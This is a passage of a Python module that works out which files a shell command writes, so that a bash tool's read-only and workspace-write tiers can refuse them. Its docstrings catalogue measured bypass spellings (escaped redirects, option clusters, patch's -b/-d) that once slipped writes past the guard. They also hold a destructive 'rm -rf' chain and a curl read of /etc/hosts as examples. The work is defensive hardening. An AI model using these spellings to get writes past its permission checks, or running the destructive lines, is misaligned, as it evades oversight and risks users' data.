    over 88 spellings (4 operators x every masking x 4 prefixes), each run as
    `/bin/sh -c` in a fresh scratch directory and the directory listed afterwards:
    8 rows name the wrong file or nothing at all, and 4 of them are ALLOWED at
    `read-only` although the shell created a file (`echo x >\\| log` and its three
    prefixes create `|` and were allowed; `echo x >\\> log` names `log` while the
    shell wrote `>`) — issue #1307.

    Recovered with the **same lexer the walk already uses**, on a line with every
    escaped control character replaced by a private-use placeholder: the escape
    has to survive as part of its word (`>\\|` has to read as the operator `>` and
    the word `|`, not as `>` and a separator), and the placeholder is what keeps
    it there. The masked line is then compared *word for word* with the reading
    the walk was handed, and only when the two are the same words is "this word
    carried an escape" a fact about that index. That comparison is the whole
    safety property, and it is what makes quoting a non-issue rather than a second
    parser: the masked reading goes through the same POSIX lexer, so quotes are
    resolved in it exactly as in the plain one. Where the two disagree — measured,
    an escape *inside* quotes (`echo x '\\>' log`, where the shell keeps the
    backslash the mask takes away) and an escaped backslash beside its operator
    (`echo x \\\\> log`, where the mask swallows the operator) — the answer is
    "cannot say" rather than a guess, and the walk keeps the answer it had.

    Measured over a 588-row family (4 prefixes x 21 operator spellings x 7 targets,
    every row run as `/bin/sh -c` in a fresh scratch directory and the directory
    listed afterwards): 392 rows really write a file, the walk names every one of
    them, and `read-only` refuses every one of them — 0 unnamed writes and 0
    invisible writes, against 8 and 4 before the fix. Over the same family the
    over-blocks fall from 86 to 18, and 4 of the 18 are new: a line whose
    operator-shaped word is a *quoted argument* (`echo x '>' \\|`) is read as a
    redirect to the escaped word behind it, because the quoting is unresolvable
    there (#1280's "cannot say") while the escape is not. All 4 write nothing —
    measured — so they are the over-block direction the walk already prices.

    What it does not claim, also measured: 28 of the 588 rows answer "cannot say",
    and every one of them carries an escape *inside quotes* (`echo x '\\>' log`),
    where masking the escape changes the word and the comparison rejects it. Those
    rows keep today's answer, which is a refusal for naming the following word —
    the over-block direction, nothing lost.

    Not consulted outside the redirect walk, and that boundary is stated too:
    `rm a\\;b` already names `a;b` in the plain reading, while a line whose
    *command* boundary carries the escape (`echo x \\; rm -rf <dir>`) is still
    read as a chain — again the over-block direction, refusing a line that
    removes nothing.
    """
    prepped = _protect_windows_backslashes(_strip_line_continuations(cmd))
    if any(placeholder in prepped for placeholder in _ESCAPE_PLACEHOLDERS.values()):
        return None                      # the line carries the marker: nothing claimed
    masked = prepped
    for ch, placeholder in _ESCAPE_PLACEHOLDERS.items():
        masked = masked.replace("\\" + ch, placeholder)
    if masked == prepped:
        return set()                     # answered: no control character is escaped
    try:
        lex = _shell_lexer(masked, True)
        lex.whitespace_split = True
        masked_tokens = list(lex)
    except ValueError:
        return None
    restored = [_restore_escape_placeholders(t) for t in masked_tokens]
    if restored != tokens:
        # The two readings are not known to be the same words, so "this word
        # carried an escape" is not a fact about any token in ``tokens``.
        return None
    placeholders = tuple(_ESCAPE_PLACEHOLDERS.values())
    return {
        index for index, tok in enumerate(masked_tokens)
        if any(placeholder in tok for placeholder in placeholders)
    }


def _unresolved_operator_run_tails(tokens: list[str],
                                   escaped: "set[int] | frozenset[int]" = frozenset(),
                                   ) -> list[str]:
    """Operator-shaped tokens sitting in **target** position, for issue #1280.

    Asked only when the two lexings disagreed, i.e. when the walk cannot say
    which operator-shaped tokens came from quoting. The first token of a run is in
    operator position — believing it keeps a real redirect naming the path behind
    it — while everything after it is in *target* position, where a token can only
    be operator-shaped because it was quoted into being a path.

    Restricted to a run that **swallows the rest of the line** (end of input, or a
    command separator): that is the geometry where the tail would otherwise be
    walked past and its file never named, which is what let `read-only` allow the
    write in #1280. Where a non-operator token follows the run the walk already
    names it, and naming the tail as well would add a claim about a command that
    cannot run — `echo x > > out` is `rc=2` in `/bin/sh` and `bash` in a fresh
    scratch directory, and creates nothing — so the narrower reading is kept.

    Measured over 320 generated commands (4 prefixes x 4 redirect spellings x 5
    targets x 4 partially quoted shapes), each run by the real shell: answering
    this way takes the holes from 96 to 0 and introduces none.

    What the direction costs, also measured rather than argued: a line whose
    operator-shaped words are *all* quoted arguments and which therefore writes
    nothing (`echo 'a'b '>' '>'`, `test 'a'b '>' '>'`) is newly refused — 6 of the
    9 such shapes tried. They are indistinguishable from the class above at the
    token level, which is exactly the fact the pairing could not recover, so the
    trade is 96 writes-that-happened no longer allowed against 6 echoes no longer
    allowed. Kept because the walk is the tier that exists to refuse writes.

    ``escaped`` is the fact this helper could not recover on its own (issue #1307):
    a word that reached operator shape through a backslash is a path, so it neither
    joins a run nor counts as the separator that ends one. Leaving it out is not
    merely untidy — measured over the 588-row family below, the same walk refuses
    54 lines that write nothing when this helper is handed no escape fact, and 18
    when it is, so 36 of those refusals are this helper reading an escaped word as
    an operator-run tail.
    """
    tails: list[str] = []
    i = 0
    while i < len(tokens):
        if i in escaped or not _is_redirect_operator(tokens[i]):
            i += 1
            continue
        j = i + 1
        while j < len(tokens) and j not in escaped and _is_redirect_operator(tokens[j]):
            j += 1
        if j - i >= 2 and (j == len(tokens)
                           or (j not in escaped and tokens[j] in _COMMAND_SEPARATORS)):
            tails.extend(tokens[i + 1:j])
        i = j
    return tails


# Verbs that write to a path named by one of their **options**, not by an operand.
# Each entry lists the options that name the destination; the value is read in every
# spelling getopt accepts (see `_option_destination_values`).
#
# Only verbs whose destination option means one thing regardless of the other flags
# are listed, because the alternative is a per-verb flag grammar (the #461 class).
# `tar` is the case that proves the point and is deliberately absent: `-f`'s value
# is a *write* under `-c`/`-r`/`-u` and a *read* under `-x`/`-t`, and `-C` is where
# files land when extracting but only a directory to collect from when creating —
# so `tar -cf out.tgz -C /etc .` writes nothing outside and would be falsely
# refused by a rule that named `-C`. Measured ground truth for the families it does
# not cover (`tar`, `git clone`, and the cluster spelling `curl -so<dir>`) is pinned
# as a measured hole in `tests/test_bash_tool_option_destinations.py` — with the
# verdict each one really gets rather than a blanket "allowed": all of them reach
# `workspace-write` with an empty target list, and `git clone` is refused under
# `read-only` by the git-mutator rule (which is not this walk) rather than by any
# named destination.
#
# `rsync` used to be on that list and is no longer: its destination is an operand
# rather than an option, so the list's own reason for excluding it never applied to
# it. It has its own branch (see `_rsync_run_is_a_read`), and its row was removed
# from the pinned-hole table in the same change.
#
# `split` was on it and has left the same way, for the operand-shaped half of the
# same reason: the paths it writes are derived from an operand rather than named by
# an option. It has its own branch (see `_SPLIT_OPTIONS_WITH_VALUE`), its own file
# `tests/test_bash_tool_split_prefix.py`, and its row left the pinned-hole table in
# that change.
#
# `zip` was on that list and has left it as well: the archive is readable from the
# first operand, and the read half is the `-T`/`-sf`/`-L`/`-h` spelling rather than
# the value of an option, so it became a per-verb rule (`_zip_write_targets`) with
# its own file `tests/test_bash_tool_zip_archive.py`. Its row was added to the
# pinned-hole table when `split` left, and removed again when the rule landed — the
# same departure, not a reversal of it: what the table could not express is the
# operand-shaped destination, and `zip` is one (`tar`'s per-verb grammar is the case
# that still refuses a rule). The measured table for it is the comment above
# `_ZIP_OPTIONS_WITH_VALUE`, and the residual the rule still leaves — a spelling it
# names nothing for — is recorded there rather than in the hole table.
#
# `csplit` is the one entry a table of destination options cannot finish describing,
# so it is listed **and** branched: `-f` names the prefix its family is written
# under, and with no `-f` the family still lands — on the default prefix `xx`, in the
# working directory — which no option spells. See the `csplit` arm in
# `_extract_write_targets`; its row left the pinned-hole table in the same change.
#
# The two sets below are declared once and derived from each other, the way
# `_LZ4_VALUE_TAKING_SHORT` derives from `_LZ4_OPTIONS_WITH_VALUE`: the destination
# set is the `-f` half, and the value-taking set is what `_positional_args` must skip
# so that a prefix is not read as an operand.
_CSPLIT_PREFIX_OPTIONS: frozenset[str] = frozenset({"-f", "--prefix"})
_CSPLIT_OPTIONS_WITH_VALUE: frozenset[str] = _CSPLIT_PREFIX_OPTIONS | frozenset({
    "-n", "--digits",          # the suffix's digit count
    "-b", "--suffix-format",   # GNU only
})
_OPTION_DESTINATION_VERBS: dict[str, frozenset[str]] = {
    "curl": frozenset({"-o", "--output"}),
    "wget": frozenset({"-O", "--output-document"}),
    "sort": frozenset({"-o", "--output"}),
    "unzip": frozenset({"-d", "--directory"}),
    "csplit": _CSPLIT_PREFIX_OPTIONS,
}


def _short_option_letters(table: frozenset) -> set[str]:
    """The single-letter options of a table, without their leading ``-``.

    Derived from the table rather than written a second time, so a letter added
    to a verb's table cannot be read in the spaced spelling and silently not in
    the clustered one. Long names are dropped: a cluster is a run of *short*
    options by definition.

    Defined above the tables that call it at import time — a verb's cluster
    letters are derived here, not restated at the call site.
    """
    return {
        opt[1:] for opt in table if opt.startswith("-") and not opt.startswith("--")
    }


# The short letters each of those verbs takes a **value** for. A destination can be
# carried by a *cluster* (`curl -so <f>`), and splitting one is not a guess work this
# walk may make freestyle: the value belongs to the first letter in the cluster that
# takes one, so the verb's own grammar decides whether ``-ko out.txt`` means "`-o`,
# value `out.txt`" or "`-k`, value `o`, and `out.txt` is an operand to **read**".
# Measuring says the second: `sort -ko out.txt in.txt` exits 2 with `-k o: Invalid
# argument` and creates nothing, while `sort -bo out.txt in.txt` exits 0 and writes
# `out.txt` (BSD `sort 2.3-Apple (199)`, this host, 2026-09-20).
#
# Which letters those are comes from each tool's own statement of its grammar:
#
#   sort    Usage: sort [-bcCdfigMmnrsuz] [-kPOS1[,POS2] ...] [-S memsize]
#           [-T tmpdir] [-t separator] [-o outfile] [file ...]      → {k, o, S, T, t}
#   unzip   Usage: unzip [-Z] [-opts[modifiers]] file[.zip] [list] [-x xlist]
#           [-d exdir]  (plus `-P password`, man unzip)              → {d, P}
#   curl    `curl --help all` (8.7.1), the 27 short options whose help shows an
#           argument right after the long name, in any of curl's three notations
#           (`<…>`, `{…}`, `[…]`, the last being `-x --proxy [protocol://]host`) → below
#
# The errors are not symmetric, and the table is built to err the safe way: a letter
# **missing** from a set leaves that spelling unnamed (the hole this closes), while a
# letter wrongly **added** stops the scan on it and leaves the spelling unnamed too —
# so the table can only under-read, never invent a name. Two letters are absent for
# reasons a later reader would otherwise re-derive:
#
# * `unzip -x`'s xlist is the *words that follow*, not a value in the token: in a
#   scratch directory `unzip -xd foo a.zip` extracted into `foo/`, i.e. `d` was read
#   as an option letter whose value is `foo` — exactly the reading this table gives.
# * `curl -d` **is** present, and the measurement is why: `curl -do out3.txt <url>`
#   exits 6 (`Could not resolve host: out3.txt`) with nothing created, so `-d`'s value
#   is `o` and `out3.txt` is the URL. Without `d` the scan would stop on the `o` and
#   name a URL as a destination — the false block.
_OPTION_DESTINATION_VALUE_TAKING: dict[str, frozenset[str]] = {
    "curl": frozenset("AbcCdDeEFhHKmoPQrtTuUwxXyYz"),
    "sort": frozenset("koSTt"),
    "unzip": frozenset("dP"),
    # Derived from the table the operand walk already carries for this verb rather than
    # written a second time: `-f` is the prefix, `-b` the suffix format, `-n` the digit
    # count. Measured on BSD `csplit` — `csplit -kf pfx in.txt` exits 0 and creates
    # `pfx00 pfx01` beside `in.txt`, so `-k` takes no value and `pfx` is `-f`'s. Before
    # this row the walk answered the *default* prefix `xx` for that spelling, which is a
    # wrong name rather than a missing one: the run writes `pfx00…` and the message names
    # a path it never touches.
    "csplit": frozenset(_short_option_letters(_CSPLIT_OPTIONS_WITH_VALUE)),
}


def _leading_short_option_value(tok: str, letters: set[str]) -> str | None:
    """The value an *attached* short option carries in its own token, or ``None``.

    ``-o<file>`` is the spelling getopt allows for any option that takes a value,
    and nothing about it is speculative: measured on GNU (``debian:bookworm-slim``,
    one directory outside every allowed root) ``curl -o<dir>/f``, ``sort -o<dir>/f``
    and ``unzip -d<dir>`` each deliver the file into ``<dir>``, so a reader that
    knows only the spaced form leaves a real write unnamed — the same fail-open the
    `-t` spellings had.

    Only a *leading* option is read, and that is deliberate rather than partial:
    a token like ``-so<dir>`` has to be split by a grammar this walk does not have,
    and the two ways of guessing are not equally bad. Reading the remainder as a
    value would be right for ``-so<dir>`` but wrong for ``-ko<file>`` (where ``k``
    took ``o`` as *its* value and ``<file>`` is an operand to **read**), and naming
    a read is a false block — the direction this guard's own record treats as worse
    than the hole. So a cluster that does not lead with the destination letter is
    left unnamed **here**, and read by ``_short_cluster_option`` where the caller has
    supplied the verb's value-taking letters (``_OPTION_DESTINATION_VALUE_TAKING``);
    a verb with no such table keeps the residual instead of a guess.
    """
    if len(tok) < 3 or not tok.startswith("-") or tok.startswith("--"):
        return None
    if tok[1] in letters:
        return tok[2:]
    return None


def _short_cluster_option(
    tok: str,
    args: list[str],
    j: int,
    letters: set[str],
    optional_letters: frozenset[str] = frozenset(),
) -> tuple[str, str | None, bool] | None:
    """The value-taking option a *short-option cluster* carries, or ``None``.

    getopt allows several short options in one word, and a value-taking letter may
    sit anywhere in it, so the cluster — not the bare ``-S`` token — is where its
    value is decided. Scanning stops at the first letter in ``letters``, because
    everything after it is *that* option's value: ``-mD`` is a mode of ``D``, not
    a ``-D``, and reading the rest of the token as another option is the class
    ``_leading_short_option_value`` refuses to guess at.

    ``optional_letters`` names the options whose argument is **optional** (getopt's
    ``b::``), and they stop the scan just as a value-taking letter does — but an optional
    argument is never the *next word*, so the rest of the token is its value even when
    that rest is empty, and ``attached`` is True either way. A caller therefore sees "the
    value rode in this token" and eats nothing, which is what getopt does. Measured on
    this host (`patch`, whose optstring is `b::B:cCd:D:eEfF:g:i:lnNo:p:r:RstTuvV:x:Y:z:Z`):
    `patch -b .bak f` rc=2 `too many file arguments` — `-b` took no word — while
    `patch -bsdout f` rc=0 rewrites the cwd's `f`, `-b` having swallowed `sdout`.

    Returns ``(letter, value, attached)``:

    * ``attached`` True — the value is the remainder of the same token (``-aSb``
      is a suffix of ``b``, ``-t<dir>`` a target directory of ``<dir>``);
    * ``attached`` False — the letter is the token's last, so getopt takes the
      **next word** as its value and that word is not an operand (``value`` is
      ``None`` when the command ends there, which getopt reports as a missing
      argument).

    That second case is the whole point of this function existing separately from
    ``_leading_short_option_value``: the operand reader has to know when the next
    word has been *eaten*, and it cannot tell that from a leading-letter reader.
    Measured 2026-09-20 in ``_positional_args``' docstring.
    """
    if not tok.startswith("-") or tok.startswith("--") or len(tok) < 2:
        return None
    body = tok[1:]
    for k, ch in enumerate(body):
        if ch in optional_letters:
            return (ch, body[k + 1:], True)
        if ch in letters:
            rest = body[k + 1:]
            if rest:
                return (ch, rest, True)
            return (ch, args[j + 1] if j + 1 < len(args) else None, False)
    return None


def _words_eaten(attached: bool) -> int:
    """How many words a cluster reader's answer consumes: **2** when the value is the next word.

    This is the advance a reader owes the shared answer above, named once because it is the
    same fact at every site that reads it (``_patch_cluster_values``, ``_zip_out_values``)
    and a site that gets it wrong does so quietly: stepping over the eaten word is what
    keeps it from being read a second time as a *spelling* — of a cluster
    (``patch -d -sd <dir> f``, where the re-read names the same directory twice) or of a
    destination option (``zip -b -Osrc.zip a.zip f``, where the re-read names ``src.zip``
    instead of the archive really written). Both rows are pinned, with this function as the
    mutation arm, in ``tests/test_bash_tool_patch_targets.py`` and
    ``tests/test_bash_tool_zip_archive.py`` (issue #1454).

    ``attached`` True means the value rode inside the token, so nothing follows it and no
    word is eaten; False means getopt took the next word, which is therefore not an operand.
    The operand walk reaches the same effect through ``skip_next`` rather than through an
    index — one word either way, so there is no third caller here to serve. The three
    readers that do **not** step are named in issue #1455, which asks that question rather
    than answering it.
    """
    return 1 if attached else 2


def _option_destination_values(
    tokens: list[str],
    i: int,
    verb: str,
    options: frozenset | None = None,
    cluster_letters: frozenset[str] = frozenset(),
) -> list[str]:
    """The paths a verb writes to that are named by an **option**, not an operand.

    ``curl -o <file>``, ``wget -O <file>``, ``sort -o <file>`` and
    ``unzip -d <dir>`` name their destination nowhere in operand position, so no
    operand rule can reach it and the walk reported **no target at all** — which
    both tiers allow by construction (the loop that judges targets never runs).
    Measured on the landing tree of #1399 (master + the everyday-writer fix), in a
    geometry whose target lay outside every allowed root: all four were ALLOW at
    both tiers with an empty target list, while ``truncate``, ``tee`` and ``cp``
    were refused.

    The destination is the option's value in every spelling getopt accepts — the
    spaced one (``-o FILE``), the attached one (``-oFILE``, see
    ``_leading_short_option_value``) and both long forms (``--output FILE``,
    ``--output=FILE``). A value of exactly ``-`` is skipped, because that is the
    documented way these options mean **stdout**: measured, ``wget -O - <url>`` and
    ``sort -o - x`` leave nothing on disk.

    Two measured notes a later reader would otherwise have to re-derive:

    * The long ``=`` form is **not** accepted by every tool — ``curl --output=<f>``
      exits 2 and ``unzip --directory=<d>`` exits 11 with nothing written, while
      ``sort`` and ``wget`` accept theirs. It is still read, because the two
      readings are not equally costly: reading it refuses a command that was going
      to fail anyway, and not reading it would miss a real write on a tool that
      does accept it.
    * A repeated option is over-approximated: every value is named, though these
      tools take the last. That is the same direction the rest of this walk errs in.

    ``options`` is the table to consult, and it is **per verb** for the same reason
    ``_positional_args``'s is: a verb that has its own branch because its operand
    list *also* names writes (`patch`, whose `-o` displaces its operands) passes its
    own set rather than joining the shared table below. Omitting it keeps the
    historical lookup, which is what the branch that walks that table still reads.

    ``cluster_letters`` switches on the **clustered** spelling and is opt-in for the
    same reason ``_positional_args``'s is: a token that does not lead with the
    destination letter can only be split by the verb's own grammar, and that grammar
    is not in `options` — `options` names the *destinations*, while the value is
    decided by the **first** letter the verb takes a value for. So the caller passes
    that verb's value-taking letters, the scan stops there, and the value is named
    only when the letter that carried it is one of the destination letters:
    `-so<dir>` and `-qo <dir>` carry their value on `o`, while `sort -ko out.txt`
    carries it on `k` (`-k o`) and `out.txt` is an operand to **read** — which is why
    a union of every verb's letters is the wrong table to hand this parameter and why
    the sites that can pass it are the ones whose grammar has been measured
    (`pzstd`, whose value-taking letters are `o` and `p`). A site that passes nothing
    keeps the historical reading, so a cluster there leaves the destination unnamed
    and pinned as a measured residual rather than guessed at — `curl -so<dir>` is
    that row, in `tests/test_bash_tool_option_destinations.py`.
    A ``--`` that no option consumed ends option parsing, so an option *after* it
    is an operand and names nothing **here** — no option on the line names a
    destination. Whether the walk names that operand is the operand rule's own
    business: for the destination-last family (`cp`/`mv`/`ln`/`install`) it is the
    last operand, so `cp -- -t OUT src.txt` is read as the copy it is — destination
    `src.txt`, the token real `cp` writes into (measured: `cp -- -t x dest` exits 0
    with both operands inside `dest`) — while `OUT`, the option's value, is never
    named because no option is in force there.

    Measured 2026-09-19 on master `26449c59`, in one scratch directory, each row
    run against a fresh one and the directory read back off disk afterwards. The
    option *before* the terminator is the control, the same command with it after:

      ``sort -o OUT/f in.txt``   rc=0 writes OUT/f   ·  ``sort -- -o OUT/f in.txt``   rc=2, nothing written
      ``unzip -d OUTD a.zip``    rc=0 writes OUTD/*  ·  ``unzip -- -d OUTD a.zip``    rc=10 ``must specify
                                                          directory``, nothing written
      ``curl -o OUT/f <url>``    rc=0 writes OUT/f   ·  ``curl -- -o OUT/f <url>``    rc=0, nothing written

    Each terminator form was **refused at both tiers** on master, because the path
    was named — a false block of a command that writes nothing at all, and the same
    defect class from the other side. (`wget` is the table's fourth verb and is not
    installed on this host, so it is left unmeasured rather than inferred.)

    ``cluster_letters`` is the opt-in half of that same reading, for the spelling whose
    destination letter is *not* the token's first: ``curl -so <f>``. It is the verb's
    **full** value-taking letters — including the destination letter itself, which is
    what every row of ``_OPTION_DESTINATION_VALUE_TAKING`` holds for its verb (a set
    missing it reads nothing at all), and with it the token is split by
    ``_short_cluster_option``, the reader the operand walk uses, rather than by
    ``_leading_short_option_value``, which by construction can only see a *leading*
    letter. Omitting it keeps the historical reading: a cluster then names nothing
    here, the pinned residual this parameter exists to close.

    Measured 2026-09-20 on this host (BSD `sort 2.3-Apple (199)`, `UnZip 6.00`,
    `curl 8.7.1`), each row in a scratch directory and the directory read back off
    disk. The last two are the ones that keep the table honest in both directions:

      ``sort -bo o/out.txt in.txt``        rc=0  o/out.txt created
      ``sort -ko o/out.txt in.txt``        rc=2  ``-k o: Invalid argument``, nothing created
      ``unzip -qd o/zd a.zip``             rc=0  m.txt extracted into ``o/zd``
      ``unzip -xd foo a.zip``              rc=0  extracted into ``foo/`` — so ``d`` is the
                                                  option and ``foo`` its value, not ``x``
                                                  taking ``d``
      ``curl -so o/f file://…``            rc=0  ``o/f`` holds the file
      ``curl -do o/f <url>``               rc=6  ``Could not resolve host: o/f``, nothing
                                                  created — ``d``'s value is ``o`` and the
                                                  URL is ``o/f``, so ``d`` must be in the
                                                  letters or the URL is named instead

    A word a value-taking letter **eats** is stepped over (`_words_eaten`), whichever
    letter ate it — the gap issue #1455 names. The cluster scan stops at the first
    value-taking letter, and when that letter is *not* the destination letter its value
    word was nevertheless consumed: reading it again as an option names a path the run
    never writes. Measured 2026-09-20 on this host, one fresh directory per row with the
    listing read back off disk (the eaten word is the *option token itself* in both rows,
    which is what makes the defect reachable — `-T`'s value is the directory `-o`, so the
    word after it is an input; `-A`'s value is the user agent `-o`, so the word after it
    is a URL):

      ``sort -T -o out f``                 rc=0  prints to stdout, nothing written but the
                                                  two inputs   · walk named ``out``, a false block
      ``sort -T . -o out2 f``              rc=0  ``out2`` created      (control: ``-o`` in force)
      ``curl -A -o out file://…``          rc=0  bytes on stdout, the directory empty
                                                  · walk named ``out``, a false block
      ``curl -A UA -o out2 file://…``      rc=0  ``out2`` created       (control)
      ``unzip -Pd secret a.zip``           rc=0  extracts into ``secret/``   (control: ``P``
                                                  eats ``d``, so ``d`` is not the option —
                                                  the same step, in the direction that keeps
                                                  the *value* from being read as one)

    A **long** option that eats the word is the same geometry and is *not* stepped over, so
    it is pinned as this reader's one measured limit rather than left silent: the letters a
    cluster is split by are short letters, and enumerating a verb's value-taking *long*
    options would be the per-command flag table this walk keeps refusing (#461). Measured
    on this host 2026-09-20: ``curl --user-agent -o out file:///etc/hosts`` exits **0**,
    prints the file to stdout and creates nothing, while the walk still names ``out`` —
    a false block of a run that writes nothing. The row is pinned, with that reason, in
    ``tests/test_bash_tool_option_destinations.py``.
    """
    options = _OPTION_DESTINATION_VERBS[verb] if options is None else options
    longs = {opt for opt in options if opt.startswith("--")}
    letters = {opt[1:] for opt in options if not opt.startswith("--")}
    out: list[str] = []
    args = _args_after_command(tokens, i)
    idx = 0
    while idx < len(args):
        tok = args[idx]
        if tok == "--" and (idx == 0 or args[idx - 1] not in options):
            # Not consumed as the previous option's value (``sort -o -- f`` names
            # the file ``--``), so it ends option parsing.
            break
        eaten = 1
        if tok in options:
            if idx + 1 < len(args):
                out.append(args[idx + 1])
            eaten = 2
        elif tok.startswith("--"):
            for long_opt in longs:
                if tok.startswith(long_opt + "="):
                    out.append(tok.split("=", 1)[1])
                    break
        elif cluster_letters:
            # The destination letter sits **inside the cluster** rather than at its
            # head, so the token is split by the verb's own value-taking letters —
            # the same reading ``_short_cluster_option`` gives the operand walk. One
            # reader, not two: it also answers the attached ``-o<f>`` form, so the
            # fallback below would name the value twice. A cluster whose first
            # value-taking letter is *not* the destination letter names nothing
            # here: `sort -ko out.txt` is `-k o` plus an operand to read — but its
            # value word is still **eaten**, and is stepped over for exactly that
            # reason (the paragraph on the eaten word above).
            cluster = _short_cluster_option(tok, args, idx, cluster_letters)
            if cluster is not None:
                letter, value, attached = cluster
                eaten = _words_eaten(attached)
                if letter in letters and value:
                    out.append(value)
        else:
            attached = _leading_short_option_value(tok, letters)
            if attached is not None:
                out.append(attached)
        idx += eaten
    return [value for value in out if value != "-"]


# `patch` **rewrites the files it is pointed at**, and it was invisible to this walk
# in every spelling (measured 2026-09-19, `cyc20260919-202406`): on master `15733088`
# `patch <outside>/f`, `patch -o <outside>/out <workspace>/in` and
# `patch -d <outside> <workspace>/f` each reported an **empty target list** at both
# tiers — and an empty list is allowed by construction, so the loop that judges
# targets never ran. `rm`, `truncate -s 0` and `cp` on the same paths were refused in
# the same geometry, which is what makes this a hole rather than an opinion. It is
# the same family as `sed -i` / `perl -i` / `truncate` (#1162, #1421) and the
# compressors (#1418): a program whose *purpose* is to modify a file in place.
#
# Ground truth, taken in a scratch directory on this host and read back off disk (BSD
# `patch 2.0-12u11-Apple`, 2026-09-19), because the verdict is not the evidence:
#
#   patch v.txt < d.patch        rc=0  v.txt rewritten (`two` → `TWO`)
#   patch -o out.txt v2.txt < …  rc=0  out.txt holds the patched text, **v2.txt is
#                                      untouched** — with `-o` the operand is a source
#   patch -i d.patch v.txt       rc=0  v.txt rewritten (`-i` names the patch to read)
#   patch -d sub v.txt < …       rc=0  **sub/v.txt** rewritten, the cwd copy untouched
#   patch -dsub v.txt < …        rc=0  same (`-d`'s value in its own token or attached)
#   patch --dry-run v.txt < …    rc=0  prints "patching file v.txt", v.txt **unchanged**
#   patch -s v.txt < …           rc=0  rewritten (quiet is not a read)
#   patch -o only.txt < …        rc=1  no output file; `only.txt.rej` lands beside it
#   patch < d.patch              rc=0  the file named by the diff header is rewritten
#
# Three consequences, and each is a piece of the rule below:
#
# 1. The **operands are the targets** when no `-o` is given — every one of them, the
#    rule `rm` reads, rather than an invented "first operand" special case.
# 2. `-o`/`--output` is a destination and it **displaces** the operand list: with it,
#    the operand is read and only that file is written (measured above). The two
#    readings are alternatives, exactly as `-t <dir>` is for `ln`/`cp`/`mv`.
# 3. `-d`/`--directory` is where the write *lands*, so its value is named as well: a
#    rule that named only the operand would read `patch -d <outside> <workspace>/f`
#    as an in-workspace write, which is the miss measured against master above.
#
# `--dry-run` is the one **read** spelling and is honoured: measured, the same command
# with it writes nothing, so naming its operand would refuse a run that changes no
# byte — the false block this walk treats as the worse error.
#
# The table below keeps a value from being read as an operand: without it `patch -p 1
# <outside>/f` would name the strip count, the defect `_positional_args`'s docstring
# sets out. Its letters come from this host's BSD usage line (`patch [-bCcEeflNnRstuv]
# [-B backup-prefix] [-D symbol] [-d directory] [-g vcs-option] [-F max-fuzz]
# [-i patchfile] [-o out-file] [-p strip-count] [-r rej-name] [-V …] [-x number]
# [-Y prefix] [-z backup-ext] [--quoting-style style] [--posix]`) plus the GNU long
# spellings the CI platform's twin documents. A letter one implementation rejects is
# harmless here: it means its value is not a path either.
_PATCH_OUTPUT_OPTIONS: frozenset[str] = frozenset({"-o", "--output"})
_PATCH_DIRECTORY_OPTIONS: frozenset[str] = frozenset({"-d", "--directory"})
_PATCH_OPTIONS_WITH_VALUE: frozenset[str] = frozenset({
    "-B", "--prefix", "-D", "--ifdef", "-d", "--directory", "-F", "--fuzz",
    "-g", "--get", "-i", "--input", "-o", "--output", "-p", "--strip",
    "-r", "--reject-file", "-V", "--version-control", "-x", "-Y",
    "--basename-prefix", "-z", "--suffix", "--quoting-style",
})
_PATCH_READ_LONG: frozenset[str] = frozenset({"--dry-run"})

# Where a *cluster* stops is this verb's own value-taking letters, **derived** from the
# table above rather than written a second time: a letter added there cannot then be read
# in the spaced spelling and silently missed in the clustered one. It is a module
# constant, and not re-derived per call, so a mutation arm can empty exactly it — the
# shape `_LZ4_VALUE_TAKING_SHORT`'s arm uses.
_PATCH_CLUSTER_LETTERS = _short_option_letters(_PATCH_OPTIONS_WITH_VALUE)

# `patch`'s own optstring, read off this host's binary (`strings /usr/bin/patch` →
# `b::B:cCd:D:eEfF:g:i:lnNo:p:r:RstTuvV:x:Y:z:Z`), marks one option as taking an
# **optional** argument: `-b`. getopt gives an optional argument the rest of its own
# token and never the next word, so `-b<rest>` swallows the tail and no option spelled
# after it in that token is live. Measured 2026-09-20 on this host (patch file named by
# absolute path, so a chdir cannot hide it): `patch -i <abs> -bsdout f` rc=0 rewrites the
# cwd's `f` and never `cd`s to `out`; `patch -i <abs> -bsd out f` rc=2 `too many file
# arguments` (so `-d` did not take `out`); `patch -b .bak f` rc=2 `too many file
# arguments` (so `-b` took no word either). Splitting such a token with the
# required-argument letters alone gets it wrong in **both** directions, and the second is
# the worse one: it names the tail as a directory the run never enters (`patch -bsd<dir>`),
# and it eats the word that is in fact the operand — measured, `patch -bsd <outside>/f`
# rc=0 rewrites `<outside>/f` while the walk reported **no target at all**, i.e. ALLOW at
# both tiers. That is why this table is passed to the shared reader *and* to the operand
# walk, rather than modelled in the cluster walk alone.
_PATCH_OPTIONAL_ARG_LETTERS: frozenset[str] = frozenset({"b"})


def _patch_cluster_values(tokens: list[str], i: int) -> list[tuple[str, str]]:
    """Every ``(letter, value)`` getopt takes for `patch` from a **short-option cluster**.

    A cluster is several short options in one word, so the value is decided by the verb's
    grammar: the scan stops at the first letter that takes one, because everything after
    it is *that* option's value — the rule `_short_cluster_option` documents, and the one
    the read side (`-c`/`-l`/`-t` for the compressors) is written to.

    Two things are this walk's own, and both keep it from claiming more than it knows:

    * A token's **first** letter is not reported (``letter != tok[1]``). `-d<dir>`,
      `-d <dir>`, `-o<file>` and `-o <file>` are the plain attached and spaced spellings,
      read by the option's own set (`_leading_short_option_value` in
      `_patch_directory_values`, `_option_destination_values` for the output), so
      reporting them here as well would name every such path twice. Only a letter further
      in — a real cluster — is this function's business.
    * `-b`'s argument is optional (`_PATCH_OPTIONAL_ARG_LETTERS`), so the tail it
      swallows is not reported as anything and eats no word.

    A word a letter eats is stepped over (`_words_eaten`), so it is not read a second time
    as a **cluster**: in `patch -d -sd <dir> f` the `-d` takes `-sd` as its directory, and
    without the step the eaten `-sd` is scanned again and reported as a cluster too, naming
    the same directory twice. What the step does **not** do is keep `<dir>` off the target
    list — the operand reader eats `-sd` as `-d`'s spaced value and reads `<dir>` as an
    operand straight after, which this function does not change. Measured on the landing
    tree of #1451, `patch -d -sd <outside>/dir <ws>/f`, with and without the step:

      with the step   ``['<outside>/dir', '<ws>/f', '-sd']``
      without it      ``['<outside>/dir', '<ws>/f', '-sd', '<outside>/dir']``

    The longer list is the same verdict at both tiers, which is why nothing pinned the step
    until issue #1454 asked for it: the duplicate is the discriminator, and the row plus the
    arm now live in `tests/test_bash_tool_patch_targets.py`.

    Measured 2026-09-20 on this host (BSD `patch 2.0-12u11-Apple`, one fresh directory
